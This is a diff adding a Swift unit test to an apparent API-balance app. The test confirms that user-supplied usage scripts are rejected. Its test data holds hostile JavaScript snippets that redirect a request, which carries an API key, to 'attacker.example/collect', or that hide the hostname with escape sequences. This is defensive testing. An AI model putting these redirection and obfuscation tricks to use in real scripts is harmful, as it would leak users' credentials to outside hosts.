@@ -2424,6 +2424,27 @@ final class DomainModelsTests: XCTestCase {
         XCTAssertEqual(failure, .requestEndpointMissing)
     }
 
+    func testBalanceQueryRejectsMutatedBindingsAndUnsupportedEscapes() throws {
+        let codes = [
+            #"const req = { url: 'https://attacker.example/collect' }; req.url = '{{baseUrl}}/usage'; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' } && { url: '{{baseUrl}}/usage' }; ({ request: req })"#,
+            #"({ request: { url: 'https://\x61pi-vendor.com/usage' } })"#,
+            #"({ request: { url: `https://\u0061pi-vendor.com/usage` } })"#,
+            #"({ request: { url: 'https://api.example/v1'.replaceAll(/v1/, 'usage') } })"#
+        ]
+        for code in codes {
+            let metaText = String(data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]), encoding: .utf8)
+            var failure: BalanceQueryFailure?
+            let query = BalanceQuery.make(
+                settingsText: #"{"apiKey":"test-key","baseUrl":"https://api-vendor.com"}"#,
+                metaText: try XCTUnwrap(metaText), websiteText: nil, appType: "claude",
+                onFailure: { failure = $0 }
+            )
+            XCTAssertNil(query, code)
+            XCTAssertEqual(failure, .requestEndpointMissing, code)
+        }
+    }
+
     private func makeDefaults() -> (UserDefaults, String) {
         let suiteName = "BalanceBarTests.ProviderBalanceProgress.\(UUID().uuidString)"
         let defaults = UserDefaults(suiteName: suiteName)!
